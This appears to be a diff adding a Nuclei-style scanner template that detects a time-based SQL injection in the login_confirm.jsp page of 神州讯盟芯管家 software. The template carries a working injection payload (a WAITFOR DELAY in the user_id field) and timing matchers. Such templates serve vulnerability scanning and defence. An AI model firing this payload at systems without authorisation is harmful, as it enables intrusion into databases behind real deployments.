@@ -1,0 +1,33 @@
+id: poc-yaml-sunmochina-core-steward-login-confirm-jsp-sqli
+info:
+  name: 神州讯盟芯管家 login_confirm.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in 神州讯盟芯管家 at the login_confirm.jsp endpoint.
+
+variables:
+  t1: "{{rand_int(1,5)}}"
+  t2: "{{to_number(t1)*2}}"
+  t3: "{{to_number(t2)+2}}"
+
+http:
+  - raw:
+      - |
+        POST /login_confirm.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        user_id=1%27;WAITFOR+DELAY+%270:0:{{t1}}%27--&sn=8&macadress=&wm_types=%C4%A3%CC%AC%B4%B0%BF%DA&url=%2FSunmoIC%2F698D51A19D8A121CE581499D7B701668.jsp&url2=%2FSunmoIC%2F698D51A19D8A121CE581499D7B701668.jsp&password=admin&version=%D6%D0%CE%C4
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(url_decode(body), "系统暂无该用户或该用户被锁定")
+          - contains(url_decode(body), "神州讯盟软件")
+          - duration > to_number(t2)
+          - duration < to_number(t3)
